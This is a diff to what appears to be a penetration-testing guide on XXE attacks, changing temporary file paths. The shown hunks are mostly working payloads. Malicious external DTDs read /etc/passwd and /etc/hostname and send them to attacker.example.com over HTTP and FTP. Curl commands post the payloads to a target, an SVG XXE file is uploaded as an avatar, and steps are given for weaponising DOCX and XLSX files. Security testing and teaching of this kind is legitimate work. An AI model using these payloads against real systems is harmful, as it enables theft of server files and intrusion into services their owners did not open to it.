@@ -175,7 +175,7 @@ Use external DTD to extract file contents through HTTP requests.
 ```bash
 # Host a malicious DTD file on attacker server
 # Create file: evil.dtd
-cat > /tmp/evil.dtd << 'EOF'
+cat > ${TMPDIR:-/tmp}/evil.dtd << 'EOF'
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example.com/?data=%file;'>">
 %eval;
@@ -183,7 +183,7 @@ cat > /tmp/evil.dtd << 'EOF'
 EOF
 
 # Host the DTD
-cd /tmp && python3 -m http.server 8888 &
+cd ${TMPDIR:-/tmp} && python3 -m http.server 8888 &
 
 # Send the XXE payload referencing the external DTD
 curl -s -X POST \
@@ -198,7 +198,7 @@ curl -s -X POST \
 
 # For multi-line file exfiltration, use FTP protocol
 # evil-ftp.dtd:
-cat > /tmp/evil-ftp.dtd << 'EOF'
+cat > ${TMPDIR:-/tmp}/evil-ftp.dtd << 'EOF'
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.example.com/%file;'>">
 %eval;
@@ -215,7 +215,7 @@ Test XML parsing in document upload functionality.
 
 ```bash
 # SVG file with XXE
-cat > /tmp/xxe.svg << 'EOF'
+cat > ${TMPDIR:-/tmp}/xxe.svg << 'EOF'
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
@@ -227,19 +227,19 @@ EOF
 
 # Upload the SVG
 curl -s -X POST \
-  -F "file=@/tmp/xxe.svg;type=image/svg+xml" \
+  -F "file=@${TMPDIR:-/tmp}/xxe.svg;type=image/svg+xml" \
   -b "session=abc123" \
   "https://target.example.com/api/upload/avatar"
 
 # DOCX file with XXE (DOCX is a ZIP containing XML files)
-mkdir -p /tmp/xxe-docx
-cd /tmp/xxe-docx
+mkdir -p ${TMPDIR:-/tmp}/xxe-docx
+cd ${TMPDIR:-/tmp}/xxe-docx
 # Unzip a legitimate .docx file
-unzip /tmp/template.docx -d /tmp/xxe-docx
+unzip ${TMPDIR:-/tmp}/template.docx -d ${TMPDIR:-/tmp}/xxe-docx
 
 # Inject XXE into [Content_Types].xml or document.xml
 # Add DTD with external entity to document.xml
-# Repackage: cd /tmp/xxe-docx && zip -r /tmp/malicious.docx *
+# Repackage: cd ${TMPDIR:-/tmp}/xxe-docx && zip -r ${TMPDIR:-/tmp}/malicious.docx *
 
 # XLSX with XXE (same technique as DOCX)
 # Inject into xl/sharedStrings.xml or [Content_Types].xml
